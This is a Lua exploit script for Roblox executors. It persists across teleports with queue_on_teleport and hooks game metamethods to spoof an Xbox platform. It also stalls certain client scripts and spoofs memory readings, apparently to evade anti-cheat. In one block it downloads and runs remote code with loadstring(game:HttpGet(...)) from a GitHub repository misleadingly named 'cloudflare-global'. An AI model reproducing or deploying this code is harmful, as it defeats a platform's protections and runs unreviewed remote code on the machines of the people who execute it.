local CONSOLE_QOT_FILE = "experiment_console_qot.lua"

local CONSOLE_QOT_PAYLOAD = [[
local HUB_PLACE = 10179538382
local PC_PLACE = 13643807539
local CONSOLE_PLACE = 15124180230
local QOT_FILE = "experiment_console_qot.lua"
local HYPHON_URL = "https://pastefy.app/DdpWWNDc/raw"

local function get_queue()
    return queue_on_teleport
        or (syn and syn.queue_on_teleport)
        or (fluxus and fluxus.queue_on_teleport)
        or (secure_load and secure_load.queue_on_teleport)
        or KRNL_QUEUE_ON_TELEPORT
end

local qt = get_queue()
if qt and (game.PlaceId == HUB_PLACE or game.PlaceId == CONSOLE_PLACE) then
    qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
end

local function apply_console_hooks(hub_traceback)
    if getgenv().__ExperimentConsoleHooked then
        return
    end
    getgenv().__ExperimentConsoleHooked = true

    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")

    local OldNamecall
    OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()

        if Method == "IsTenFootInterface" then
            return true
        end

        if Method == "GetPlatform" then
            return Enum.Platform.XBoxOne
        end

        if hub_traceback and game.PlaceId == HUB_PLACE then
            local Traceback = debug.traceback()
            if Traceback:match("PlayerGui") then
                local lp = game:GetService("Players").LocalPlayer
                local SourceName = Traceback:gsub(
                    string.format("Players.%s.PlayerGui.", lp.Name),
                    ""
                )
                if SourceName:len() > 32 then
                    return task.wait(9e9)
                end
            end
        end

        return OldNamecall(self, ...)
    end))

    pcall(function()
        local OldIsTenFootInterface
        OldIsTenFootInterface = hookfunction(GuiService.IsTenFootInterface, newcclosure(function(self)
            if not checkcaller() then
                return true
            end
            return OldIsTenFootInterface(self)
        end))
    end)
end

apply_console_hooks(game.PlaceId == HUB_PLACE)

if game.PlaceId == HUB_PLACE then
    game:GetService("ScriptContext"):SetTimeout(1)

    local HyphonScript = nil
    local function FindHyphonScript()
        for _, Object in pairs(getnilinstances()) do
            if Object:IsA("Script") and Object.Name:len() == 32 then
                HyphonScript = Object
            end
        end
    end
    repeat
        FindHyphonScript()
        task.wait()
    until HyphonScript

    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/asdwasd.lua"))()
    end)

    qt = get_queue()
    if qt then
        qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
    end

elseif game.PlaceId == CONSOLE_PLACE then
    getrenv().gcinfo = function()
        return Random.new():NextInteger(5000, 20000)
    end

    if game.PlaceId == PC_PLACE then
        repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
        game:GetService("ScriptContext"):SetTimeout(9e9)
    end
end
]]
